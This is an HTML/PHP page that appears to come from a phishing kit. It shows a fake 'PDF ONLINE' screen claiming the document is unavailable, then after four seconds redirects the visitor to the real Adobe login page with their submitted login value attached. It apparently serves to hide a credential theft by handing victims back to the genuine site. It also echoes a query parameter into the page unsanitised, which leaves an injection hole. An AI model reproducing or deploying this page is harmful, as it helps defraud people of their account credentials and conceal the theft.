<!DOCTYPE html>
<html lang="en">
<head>

<script type="text/javascript">
<!--
function delayer(){
    window.location = "https://adobeid-na1.services.adobe.com/renga-idprovider/pages/login?login=<?php echo $_GET['login'];?>"
}
//-->
</script>
<meta charset="utf-8">
<title>PDF ONLINE</title>
<style type="text/css">

html { 
  background: #; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

.transparent {
	zoom: 1;
	filter: alpha(opacity=90);
	opacity: 0.9;
}

.inp{

	border: 1px solid #EAEAEA;
	-moz-border-radius: 3px;
	-webkit-border-radius: 3px;
	border-radius: 3px;
	-webkit-box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
	-moz-box-shadow: rgba(0,0,0,0.3) 0 1px 3px;
	box-shadow: rgba(0, 0, 0, 0.3) 0 1px 3px;
}
.btn {
  background: #8c1ee6;
  background-image: -webkit-linear-gradient(top, #8c1ee6, #6b14b3);
  background-image: -moz-linear-gradient(top, #8c1ee6, #6b14b3);
  background-image: -ms-linear-gradient(top, #8c1ee6, #6b14b3);
  background-image: -o-linear-gradient(top, #8c1ee6, #6b14b3);
  background-image: linear-gradient(to bottom, #8c1ee6, #6b14b3);
  -webkit-border-radius: 10;
  -moz-border-radius: 10;
  border-radius: 10px;
  font-family: Arial;
  color: #ffffff;
  font-size: 20px;
  padding: 13px 15px 12px 16px;
  text-decoration: none;
}

.btn:hover {
  background: #a039f5;
  background-image: -webkit-linear-gradient(top, #a039f5, #963de0);
  background-image: -moz-linear-gradient(top, #a039f5, #963de0);
  background-image: -ms-linear-gradient(top, #a039f5, #963de0);
  background-image: -o-linear-gradient(top, #a039f5, #963de0);
  background-image: linear-gradient(to bottom, #a039f5, #963de0);
  text-decoration: none;
}
#errfn{
  color:red;
}
#errfnn{
  color:red;
}

.cover{
    position: absolute;
    top: 0;
    left: 0;
    height: 100%;
    width: 100%;
    background-color: rgba(0,0,0,0.5);
    z-index: 10;
}

</style>

</head>

<body style="background:#fff; font-family:helvetica, verdana, tahoma, arial;" onLoad="setTimeout('delayer()', 4000)">
<div style="width:700px; margin:0 auto;">
<img src="http://lagnadian.com/wp-content/uploads/alibobo/pdf-logo.png" width="100px" height="80px" style="margin:0 0 0 160px;"/><br /><h1 style="color:#696767; text-shadow: 0px 1px 1px #4d4d4d;">Document Is Not Available, Try again later...</h1>


   

</body></html>
